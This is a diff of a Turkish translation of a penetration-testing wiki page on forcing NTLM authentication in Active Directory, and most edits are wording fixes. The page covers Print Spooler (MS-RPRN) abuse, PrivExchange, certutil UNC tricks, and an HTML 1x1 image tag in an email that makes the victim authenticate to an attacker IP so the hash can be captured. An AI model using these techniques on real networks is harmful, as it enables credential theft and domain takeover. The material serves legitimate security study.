@@ -4,12 +4,12 @@
 
 ## SharpSystemTriggers
 
-[**SharpSystemTriggers**](https://github.com/cube0x0/SharpSystemTriggers) **uzaktan kimlik doğrulama tetikleyicileri** içeren bir **koleksiyondur** ve 3. parti bağımlılıkları önlemek için MIDL derleyicisi kullanılarak C# ile kodlanmıştır.
+[**SharpSystemTriggers**](https://github.com/cube0x0/SharpSystemTriggers) , 3. parti bağımlılıkları önlemek için MIDL derleyicisi kullanılarak C# ile kodlanmış **uzaktan kimlik doğrulama tetikleyicileri** **koleksiyonu**dur.
 
 ## Spooler Servisi İstismarı
 
-Eğer _**Print Spooler**_ servisi **etkinse,** bazı bilinen AD kimlik bilgilerini kullanarak Alan Denetleyicisi’nin yazıcı sunucusuna yeni yazdırma görevleri hakkında bir **güncelleme** **talep** edebilirsiniz ve sadece **bildirimi bazı sistemlere göndermesini** söyleyebilirsiniz.\
-Yazıcı, bildirimi rastgele sistemlere gönderdiğinde, o **sistem** ile **kimlik doğrulaması yapması** gerekir. Bu nedenle, bir saldırgan _**Print Spooler**_ servisini rastgele bir sistemle kimlik doğrulaması yapacak şekilde yönlendirebilir ve bu kimlik doğrulamasında **bilgisayar hesabını** **kullanacaktır**.
+Eğer _**Print Spooler**_ servisi **etkinse**, bazı bilinen AD kimlik bilgilerini kullanarak Alan Denetleyicisi'nin yazıcı sunucusuna yeni yazdırma işleri hakkında bir **güncelleme** **talep** edebilir ve sadece **bildirimi bazı sistemlere göndermesini** söyleyebilirsiniz.\
+Yazıcı, bildirimi rastgele sistemlere gönderdiğinde, o **sistem** ile **kimlik doğrulaması yapması** gerekir. Bu nedenle, bir saldırgan _**Print Spooler**_ servisini rastgele bir sistemle kimlik doğrulaması yapacak şekilde yönlendirebilir ve hizmet bu kimlik doğrulamasında **bilgisayar hesabını** **kullanacaktır**.
 
 ### Alan üzerindeki Windows Sunucularını Bulma
 
@@ -28,7 +28,7 @@ Linux'te rpcdump.py kullanabilir ve MS-RPRN Protokolü'nü arayabilirsiniz.
 ```bash
 rpcdump.py DOMAIN/USER:PASSWORD@SERVER.DOMAIN.COM | grep MS-RPRN
 ```
-### Servisi rastgele bir ana bilgisayara kimlik doğrulaması yapması için isteyin
+### Servisten rastgele bir ana bilgisayara karşı kimlik doğrulaması yapmasını isteyin
 
 [ **SpoolSample'ı buradan**](https://github.com/NotMedic/NetNTLMtoSilverTicket)** derleyebilirsiniz.**
 ```bash
@@ -53,7 +53,7 @@ https://github.com/p0dalirius/Coercer
 
 `PrivExchange` saldırısı, **Exchange Server `PushSubscription` özelliğinde** bulunan bir hatanın sonucudur. Bu özellik, herhangi bir posta kutusuna sahip alan kullanıcısının Exchange sunucusunu HTTP üzerinden herhangi bir istemci sağlanan hosta kimlik doğrulaması yapmaya zorlamasına olanak tanır.
 
-Varsayılan olarak, **Exchange servisi SYSTEM olarak çalışır** ve aşırı ayrıcalıklara sahiptir (özellikle, **2019 Öncesi Kümülatif Güncelleme'de alan üzerinde WriteDacl ayrıcalıklarına sahiptir**). Bu hata, **LDAP'ya bilgi iletimini sağlamak ve ardından alan NTDS veritabanını çıkarmak** için sömürülebilir. LDAP'ya iletim mümkün olmadığında bile, bu hata alan içindeki diğer hostlara iletim ve kimlik doğrulama yapmak için kullanılabilir. Bu saldırının başarılı bir şekilde sömürülmesi, herhangi bir kimlik doğrulaması yapılmış alan kullanıcı hesabıyla Domain Admin'e anında erişim sağlar.
+Varsayılan olarak, **Exchange servisi SYSTEM olarak çalışır** ve aşırı ayrıcalıklara sahiptir (özellikle, **2019'dan önceki Kümülatif Güncelleme üzerinde WriteDacl ayrıcalıklarına sahiptir**). Bu hata, **LDAP'ye bilgi iletimini sağlamak ve ardından alan NTDS veritabanını çıkarmak** için sömürülebilir. LDAP'ye iletim mümkün olmadığında bile, bu hata alan içindeki diğer hostlara iletim ve kimlik doğrulama yapmak için kullanılabilir. Bu saldırının başarılı bir şekilde sömürülmesi, herhangi bir kimlik doğrulaması yapılmış alan kullanıcı hesabıyla Alan Yöneticisi'ne anında erişim sağlar.
 
 ## Windows İçinde
 
@@ -90,7 +90,7 @@ certutil.exe -syncwithWU  \\127.0.0.1\share
 
 ### E-posta ile
 
-Eğer ele geçirmek istediğiniz bir makineye giriş yapan kullanıcının **e-posta adresini** biliyorsanız, ona sadece **1x1 boyutunda bir resim içeren bir e-posta** gönderebilirsiniz.
+Eğer ele geçirmek istediğiniz bir makineye giriş yapan kullanıcının **e-posta adresini** biliyorsanız, ona sadece **1x1 piksel boyutunda bir resim içeren bir e-posta** gönderebilirsiniz.
 ```html
 <img src="\\10.10.17.231\test.ico" height="1" width="1" />
 ```
@@ -102,9 +102,15 @@ Eğer bir bilgisayara MitM saldırısı gerçekleştirebilirseniz ve onun görec
 ```html
 <img src="\\10.10.17.231\test.ico" height="1" width="1" />
 ```
+## NTLM kimlik doğrulamasını zorlamak ve oltalama için diğer yollar
+
+{{#ref}}
+../ntlm/places-to-steal-ntlm-creds.md
+{{#endref}}
+
 ## NTLMv1 Kırma
 
-Eğer [NTLMv1 zorluklarını yakalayabilirseniz, onları nasıl kıracağınızı buradan okuyun](../ntlm/index.html#ntlmv1-attack).\
+Eğer [NTLMv1 zorluklarını yakalayabilirseniz, bunları nasıl kıracağınızı buradan okuyun](../ntlm/index.html#ntlmv1-attack).\
 _NTLMv1'i kırmak için Responder zorluğunu "1122334455667788" olarak ayarlamanız gerektiğini unutmayın._
 
 {{#include ../../banners/hacktricks-training.md}}
